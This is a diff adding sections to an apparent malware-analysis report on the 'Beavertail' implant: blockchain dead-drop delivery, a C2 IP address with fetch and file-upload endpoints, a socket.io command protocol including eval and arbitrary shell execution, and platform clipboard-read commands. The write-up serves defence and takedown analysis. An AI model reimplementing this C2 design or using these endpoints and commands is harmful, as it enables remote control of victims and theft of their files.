@@ -97,6 +97,44 @@ correspond to the `_$_913e`/`_$_b229` cipher transition period.
 
 ---
 
+## Delivery Chain — Blockchain vs C2 IP
+
+These are two completely different servers doing different jobs. Understanding the distinction
+matters for defence and takedown:
+
+```
+TRON wallet (public blockchain)
+  └─ stores pointer: BSC TX hash in memo field
+        │
+        ▼
+BSC blockchain (public blockchain)
+  └─ TX input field contains: XOR-encrypted Stage 2 blob (77KB)
+        │  ← Beavertail is pulled FROM HERE, not from any actor server
+        ▼
+Stage 2 (Beavertail) executes LOCALLY on victim machine
+  └─ now calls out to C2 IP for the first time
+        │
+        ▼
+C2 IP (actor-owned server, e.g. 198.105.127.210)
+  ├─ GET /0x/js?_V=<campaign_id>&id=<uuid>  ← injection payload fetch
+  ├─ POST /u/f                               ← file upload
+  ├─ POST /verify-human/<path>               ← async error reporting
+  └─ socket.io connection                    ← bidirectional command channel
+```
+
+**Blocking / takedown implications:**
+
+| What's blocked | Effect |
+|---------------|--------|
+| TRON / BSC blockchain access | Stage 1 can't find the BSC TX → Beavertail never loads at all |
+| C2 IP access | Beavertail loads from blockchain and runs, but: no injection payload (VSCode/npm injection likely fails), no socket.io commands, no file upload. Implant is stranded. |
+| TRON wallet specifically | Stage 1 fails to find pointer, but Aptos fallback addresses (A1/A2/A3) provide redundancy |
+
+The blockchain delivery is what makes this resilient — TRON and BSC are public infrastructure
+with no actor-owned servers to seize. The C2 IP can be null-routed; the blockchain pointers cannot.
+
+---
+
 ## Boot Sequence
 
 1. Read `global['_H2']` (C2 base URL, set by Stage 1) → stored as `_mMJxE`
@@ -320,6 +358,111 @@ EV-4A6OE6M0E2D                     ← known analysis environment UUID
 # Socket.io C2 reconnect command format
 ss_connect:<ip>   → binds new C2 to http://<ip>:443
 ```
+
+---
+
+## Socket.io Communication — How It Works
+
+The socket.io session is set up by `lpVxjTQ()`, called once npm dependencies are installed.
+
+### Setup
+
+```javascript
+uPEgZgY = socket.io-client(_mMJxE, { reconnectionDelay: 5000 })
+//  _mMJxE = _H2 = base C2 URL (e.g. "http://198.105.127.210")
+//  socket.io-client auto-appends the default path (/socket.io/)
+//  reconnectionDelay: 5 seconds between reconnect attempts (auto-reconnects forever)
+```
+
+### Session Lifecycle
+
+```
+Victim                                    C2 server
+  │                                           │
+  │──── socket.io connect ──────────────────►│
+  │                                           │
+  │──── emit('identify', 'client', {...}) ──►│  ← registration packet
+  │     {                                     │
+  │       clientUuid:       <session_id>      │
+  │       processId:        <pid>             │
+  │       osType:           <os_string>       │
+  │       VERSION:          '260605'          │
+  │       _V:               <campaign_id>     │
+  │       CURRENT_TIMESTAMP:<ISO datetime>    │
+  │       FIRST_VISIT_TIME: <ISO datetime>    │
+  │     }                                     │
+  │                                           │
+  │◄─── on('command', <string>) ────────────│  ← operator sends command
+  │                                           │
+  │──── emit('response', <output>, <id>) ──►│  ← result sent back
+  │                                           │
+  │◄─── on('exit') ─────────────────────────│  ← operator kills process
+  │                                           │
+  │──── [disconnect] ──────────────────────►│
+  │      wait 5s, auto-reconnect             │
+```
+
+### Two Channels Out (not just socket.io)
+
+There is also a **one-way HTTP reporting channel** for async errors and status:
+
+```javascript
+_R = async function(message, context, campaign_id) {
+    POST _H2/verify-human/<campaign_id>
+    body: text=<context> [<campaign_id>] <message>
+}
+```
+
+`_R` is called internally when things fail (npm install errors, injection failures, etc.) and
+delivers status back to the C2 even when the socket.io channel isn't open yet. This is how the
+operator knows about pre-connection failures.
+
+### Command Processing
+
+Every socket.io `command` event is a plain string routed by prefix:
+
+```
+ss_info        → return system info block (no subprocess)
+ss_ip          → GET http://ip-api.com/json, return result
+ss_cb          → execReadClipboard(), return content
+ss_upf:<args>  → POST files to C2/u/f via axios multipart
+ss_upd:<args>  → POST directory tree to C2/u/f
+ss_dir:<path>  → directory listing
+ss_fcd:<path>  → file + chdir
+ss_stop        → cancel active upload
+ss_inz:<app>   → re-inject into named app (vscode/cursor/antigravity/discord/github/npm)
+ss_inzx:<path> → inject into arbitrary file path
+ss_connect:<ip>→ set _H2 = http://<ip>:443, reconnect socket
+ss_eval:<code> → eval(code), return result
+ss_eval64:<b64>→ eval(atob(b64)), return result
+ss_exit        → process.exit() [only if safe-exit flag set]
+ss_exit_f      → process.exit() [unconditional]
+cd <path>      → chdir, update currentDirectory
+<anything else>→ execSync(<command>), return stdout+stderr
+```
+
+Any unrecognized string is executed directly as a shell command. This gives the operator a
+full interactive shell over socket.io — `cd`, `ls`, `cat`, `curl`, arbitrary binaries.
+
+### Clipboard (passive — on demand)
+
+Clipboard is NOT continuously monitored. It is read synchronously when the operator sends
+`ss_cb`, using the platform-appropriate command:
+
+```
+Windows: powershell -NoProfile -Command "Get-Clipboard"
+macOS:   pbpaste
+Linux:   xclip -selection clipboard -o  (fallback: xsel --clipboard --output)
+```
+
+The result is sent back as a `response` event.
+
+### Key Properties
+
+- **Auto-reconnects every 5 seconds** if the connection drops — the implant never gives up
+- **The operator's IP is never embedded** in Beavertail; it comes from `global['_H2']` which Stage 1 sets from the blockchain dead-drop. To redirect all victims to a new C2, the actor just publishes a new TRON TX pointing to a new BSC TX with updated `_H2`.
+- **`ss_connect:<ip>`** lets the operator redirect a single live session to a different server mid-session without redeploying anything
+- **No authentication** on the socket — any client that knows the server address and emits `identify` becomes a managed victim
 
 ---
 
